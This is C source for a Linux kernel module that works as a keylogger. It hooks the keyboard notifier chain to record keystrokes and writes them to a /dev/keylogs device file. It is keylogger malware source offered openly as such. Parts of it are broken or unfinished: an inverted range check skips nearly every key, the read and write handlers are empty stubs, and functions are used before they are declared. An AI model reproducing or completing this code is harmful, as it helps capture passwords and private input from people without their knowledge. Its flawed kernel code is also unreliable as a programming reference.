#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/mm.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include "./private.h"

#define DEVICE_NAME "keylogs"

static int major;
char keyBuffer[1000000];
char commands[20];
char *filename = "/dev/keylogs";

// File operations
struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = read_logs,
    .write = write_logs,
    .open = open_logs,
    .release = release_logs
};

/* Notifier block */
static struct notifier_block keyboard_nb = {
    .notifier_call = key_hook
};

static int 
key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct file *fp;
    mm_segment_t fs;

    fp = filp_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(fp)) {
        printk(KERN_ALERT "Error encountered while opening file %c.\n", *filename);
        return 1;
    }
    struct keyboard_notifier_param *param = _param;
    fs = get_fs();
    set_fs(KERNEL_DS);

    if(0 <= param->value || param->value > 50000) return NOTIFY_OK;

    fp->f_op->write(fp, keycode[param->value], strlen(keycode[param->value]), &fp->f_pos);
    set_fs(fs);
    filp_close(fp, NULL);

    return NOTIFY_OK;
}

static int
__init keylog_init(void) {

    /* Listen for keys */
    register_keyboard_notifier(&keyboard_nb);

    memset(keyBuffer, 0, sizeof(keyBuffer));
    major = register_chrdev(0, DEVICE_NAME, &fops);

    if (major < 0)
    {
        printk(KERN_ALERT "Can't register module with %d.\n", major);
        return major;
    }

    printk(KERN_INFO "Module is registered with major number %d.\n", major);
    return 0;
}

static void
__exit keylog_exit(void) {
    unregister_keyboard_notifier(&keyboard_nb);
    unregister_chrdev(major, DEVICE_NAME);
    memset(keyBuffer, 0, sizeof(keyBuffer));
    memset(commands, 0, sizeof(commands));
    return;
}

/* open device */
static int 
open_logs(struct inode *inode, struct file *filp) {
    return 0;
}

/* read device */
ssize_t read_logs(struct file *filp, char __user *buffer, size_t length, loff_t *offset) { 
    int key;
    char *buf;

    key = 0;
    buf = keyBuffer;
    return 0;
}

/* write to device (commands) */
static ssize_t write_logs(struct file *filp, const char *buffer, size_t length, loff_t *offset) {

    /* Log captured key */
    //key_hook();
    return 0;
}

static int release_logs(struct inode *inode, struct file *filp) {
    return 0;
}

module_init(keylog_init);
module_exit(keylog_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("d0lph1n98 <d0lph1n98@yahoo.com");
